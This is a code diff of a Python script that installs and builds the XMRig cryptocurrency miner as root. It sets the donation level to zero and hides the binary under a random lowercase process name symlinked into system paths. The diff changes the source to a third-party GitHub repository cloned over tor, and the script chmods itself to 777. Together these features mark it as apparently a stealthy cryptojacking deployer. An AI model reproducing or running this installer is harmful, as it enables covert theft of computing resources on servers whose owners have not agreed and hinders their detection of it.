@@ -10,6 +10,8 @@ import ast, random, string
 useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = ''
+link_github = 'https://github.com/giautoidi/giautoidi.git'
+link_folder = 'giautoidi'
 for k in range(1, 8, 1):
     program += random.choice(string.ascii_lowercase)
 os.system('pkill ' + program)
@@ -20,15 +22,6 @@ os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
 try:
     os.system('apt-get update -y')
     os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
-    '''
-    os.chdir('/root')
-    os.system('rm -rf proxychains-ng')
-    os.system('git clone https://github.com/rofl0r/proxychains-ng.git')
-    os.chdir('proxychains-ng')
-    os.system('make')
-    os.system('make install')
-    os.system('make install-config')
-    '''
 except:
     pass
 try:
@@ -36,20 +29,18 @@ try:
     if os.path.isfile('/root/xmrig/build/xmrig') == False:
         os.chdir('/root')
         os.system('rm -rf xmrig')
-        os.system('git clone https://github.com/xmrig/xmrig.git')
-        os.chdir('xmrig')
+        os.system('torify git clone %s' %link_github)
+        os.chdir(link_folder)
         os.system('sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = 0/g" src/donate.h')
         os.system('mkdir build && cd build && cmake .. && make')
-        #os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig_tls/' + program)
-        #os.system('chmod 777 ' + program)
-        os.chdir('/root/xmrig/build/')
+        os.chdir('/root/%s/build/' %link_folder)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' +'/usr/local/bin/' + program)
         os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/bin/' + program)
         time.sleep(2)
     else:
         try:
-            os.chdir('/root/xmrig/build')
+            os.chdir('/root/%s/build' %link_folder)
             workingdir = os.getcwd()
             os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/local/bin/' + program)
             os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/bin/' + program)
